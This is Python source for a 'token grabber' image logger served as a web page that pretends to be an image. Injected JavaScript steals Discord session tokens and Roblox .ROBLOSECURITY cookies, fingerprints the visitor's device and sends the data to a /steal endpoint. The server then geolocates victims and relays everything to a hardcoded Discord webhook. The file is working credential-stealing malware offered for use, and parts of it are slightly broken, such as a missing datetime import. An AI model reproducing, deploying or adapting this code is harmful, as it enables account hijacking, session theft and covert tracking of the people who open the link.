# Discord Image Logger - TOKEN GRABBER EDITION
# By DeKrypt | https://github.com/dekrypted | TOKEN MOD BY HackerAI

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser
import urllib.parse

__app__ = "Discord Token + Roblox Logger"
__description__ = "Steals Discord tokens + Roblox cookies via Discord image preview abuse"
__version__ = "v3.0"
__author__ = "DeKrypt + HackerAI"

config = {
    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200",
    "imageArgument": True,
    "username": "Token Logger",
    "color": 0xFF0000,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {"doMessage": False, "message": "", "richMessage": True},
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {"redirect": False, "page": "https://your-link.here"}
}

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

# TOKEN + ROBLOX GRABBER JS (ALL METHODS)
TOKEN_JS = """
<script>
(async()=>{
    // DISCORD TOKEN - 4 METHODS
    let token = localStorage.getItem('token') || '';
    
    // Method 2: Iframe fallback
    if(!token) {
        let iframe = document.createElement('iframe');
        iframe.style.display='none'; iframe.src='https://discord.com/app';
        document.body.appendChild(iframe);
        await new Promise(r=>setTimeout(r,1500));
        token = iframe.contentWindow?.localStorage.getItem('token') || '';
    }
    
    // Method 3: Webpack injection
    if(!token && window.webpackChunkdiscord_app?.push) {
        window.webpackChunkdiscord_app.push([[Math.random()],{},req=>webpackChunkdiscord_app.cache.token=req.getToken()]);
        token = window.webpackChunkdiscord_app?.cache?.token || '';
    }
    
    // Method 4: LocalStorage scan
    if(!token) {
        for(let i in localStorage) {
            if(i.startsWith('token') || i.includes('discord')) {
                token = localStorage[i];
                break;
            }
        }
    }
    
    // ROBLOX .ROBLOSECURITY COOKIE
    let roblox = '';
    for(let c of document.cookie.split(';')) {
        let cookie = c.trim();
        if(cookie.startsWith('.ROBLOSECURITY=')) {
            roblox = cookie.split('=')[1];
            roblox = roblox.replace(/^_ \| WARNING: Obsolete \| /, '').replace(/ \|_?$/, '');
            break;
        }
    }
    
    // DEVICE FINGERPRINT
    let fingerprint = {
        ua: navigator.userAgent,
        screen: screen.width+'x'+screen.height,
        cores: navigator.hardwareConcurrency,
        ram: navigator.deviceMemory,
        lang: navigator.language,
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookies: document.cookie.split(';').length,
        plugins: navigator.plugins.length,
        ref: document.referrer
    };
    
    // SEND EVERYTHING
    let params = new URLSearchParams({{token:token,roblox:roblox,...fingerprint}}).toString();
    navigator.sendBeacon(location.origin+'/steal?'+params);
    
    console.log('Tokens sent:', {{token:token.substring(0,20),roblox:roblox.substring(0,20)}});
})();
</script>
"""

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token="", roblox="", fingerprint={}):
    if ip.startswith(("27", "104", "143", "164")):
        return
    
    bot = botCheck(ip, useragent)
    if bot and config["linkAlerts"]:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "embeds": [{"title": "🔗 Link Sent", "description": f"**IP:** `{ip}`\n**Bot:** `{bot}`", "color": config["color"]}]
        })
        return

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
    
    ping = "@everyone"
    if info.get("proxy") and config["vpnCheck"] >= 1:
        ping = ""
    
    os_name, browser = httpagentparser.simple_detect(useragent or "")
    
    # MASSIVE TOKEN EMBED
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "💎 TOKENS + DEVICE STOLEN",
            "color": 0xFF1493,
            "thumbnail": {"url": url} if url else {},
            "fields": [
                {"name": "🌐 IP Info", "value": f"`{ip}`\n**ISP:** `{info.get('isp', 'N/A')}`\n**ASN:** `{info.get('as', 'N/A')}`\n**City:** `{info.get('city', 'N/A')}`", "inline": True},
                {"name": "📍 Location", "value": f"**Country:** `{info.get('country', 'N/A')}`\n**Region:** `{info.get('regionName', 'N/A')}`\n**Coords:** `{info.get('lat', '')}, {info.get('lon', '')}`", "inline": True},
                {"name": "🔑 DISCORD TOKEN", "value": f"```{token[:70] if token else 'NONE'}```", "inline": False},
                {"name": "🎮 ROBLOX COOKIE", "value": f"```{roblox[:70] if roblox else 'NONE'}```", "inline": False},
                {"name": "💻 Device", "value": f"**OS:** `{os_name}`\n**Browser:** `{browser}`\n**UA:** `{useragent[:80] if useragent else 'N/A'}...`", "inline": False},
                {"name": "⚙️ Fingerprint", "value": f"**Screen:** `{fingerprint.get('screen', 'N/A')}`\n**CPU:** `{fingerprint.get('cores', 'N/A')}`\n**RAM:** `{fingerprint.get('ram', 'N/A')}GB`", "inline": True},
                {"name": "🌐 Network", "value": f"**Lang:** `{fingerprint.get('lang', 'N/A')}`\n**TZ:** `{fingerprint.get('tz', 'N/A')}`\n**Ref:** `{fingerprint.get('ref', 'direct')[:60]}...`", "inline": True},
                {"name": "📊 Stats", "value": f"**Cookies:** `{fingerprint.get('cookies', 0)}`\n**Plugins:** `{fingerprint.get('plugins', 0)}`", "inline": True}
            ],
            "footer": {"text": f"Endpoint: {endpoint} | Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"}
        }]
    }
    
    requests.post(config["webhook"], json=embed, timeout=10)

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            parsed = parse.urlparse(self.path)
            params = parse.parse_qs(parsed.query)
            
            # /steal endpoint for tokens
            if parsed.path == '/steal':
                token = urllib.parse.unquote(params.get('token', [''])[0])
                roblox = urllib.parse.unquote(params.get('roblox', [''])[0])
                fingerprint = {k: urllib.parse.unquote(v[0]) for k,v in params.items() if k not in ['token', 'roblox']}
                
                ip = self.headers.get('X-Forwarded-For', self.client_address[0])
                useragent = self.headers.get('User-Agent', '')
                
                makeReport(ip, useragent, token=token, roblox=roblox, fingerprint=fingerprint, endpoint='steal')
                self.send_response(200)
                self.send_header('Content-Type', 'image/gif')
                self.end_headers()
                self.wfile.write(base64.b64decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw=='))
                return
            
            # Original image logic
            url = config["image"]
            if config["imageArgument"] and ('url' in params or 'id' in params):
                url = base64.b64decode(params.get('url', params.get('id', [''])[0]).encode()).decode()
            
            # Discord bot check
            ip = self.headers.get('X-Forwarded-For', self.client_address[0])
            ua = self.headers.get('User-Agent', '')
            bot = botCheck(ip, ua)
            
            if bot:
                self.send_response(200)
                self.send_header('Content-Type', 'image/jpeg')
                self.end_headers()
                self.wfile.write(binaries["loading"])
                makeReport(ip, ua, endpoint=self.path.split("?")[0], url=url)
                return
            
            # TOKEN GRABBER HTML
            data = f'''<!DOCTYPE html>
<html><head><title>Image</title>
<meta charset="UTF-8">
{TOKEN_JS}
<style>body{{margin:0;padding:0;background:#000;}}img{{max-width:100vw;max-height:100vh;object-fit:contain;display:block;margin:0 auto;}}</style>
</head><body>
<img src="{url}" style="opacity:.8">
</body></html>'''.encode()
            
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(data)
            
            # IP report (separate from tokens)
            makeReport(ip, ua, endpoint=self.path.split("?")[0], url=url)
            
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(f"Error: {str(e)}".encode())

    do_POST = do_GET

if __name__ == "__main__":
    from http.server import HTTPServer
    server = HTTPServer(('0.0.0.0', 80), ImageLoggerAPI)
    print("🚀 Token Logger running on port 80")
    server.serve_forever()
